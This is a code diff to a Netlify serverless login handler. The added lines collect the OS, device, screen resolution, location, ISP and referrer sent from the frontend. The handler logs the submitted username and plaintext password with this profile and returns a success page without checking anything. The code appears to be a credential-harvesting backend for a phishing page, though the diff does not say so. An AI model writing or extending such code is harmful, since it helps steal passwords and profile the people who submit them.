@@ -10,7 +10,6 @@ exports.handler = async (event, context) => {
 
   // Parse form data
   const rawBody = event.body || "";
-  // A simple manual parse:
   const formData = {};
   rawBody.split("&").forEach((pair) => {
     const [key, value] = pair.split("=");
@@ -21,12 +20,31 @@ exports.handler = async (event, context) => {
   const username = formData.username || "";
   const password = formData.password || "";
 
-  // Get IP and User-Agent
+  // Get additional data from frontend
   const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
   const userAgent = event.headers["user-agent"] || "Unknown User-Agent";
+  const operatingSystem = formData.os || "Unknown OS";
+  const deviceType = formData.device || "Unknown Device";
+  const screenResolution = formData.resolution || "Unknown Resolution";
+  const location = formData.location || "Unknown Location";
+  const isp = formData.isp || "Unknown ISP";
+  const referralURL = formData.referrer || "Unknown Referrer";
+  const loginTimestamp = new Date().toISOString();
 
-  // Log it so you can see it in Netlify Function logs
-  console.log("Login attempt:", { username, password, ipAddress, userAgent });
+  // Log collected data (This will appear in Netlify logs)
+  console.log("Login attempt:", {
+    username,
+    password,
+    ipAddress,
+    userAgent,
+    operatingSystem,
+    deviceType,
+    screenResolution,
+    location,
+    isp,
+    referralURL,
+    loginTimestamp,
+  });
 
   // Return an HTML success page
   return {
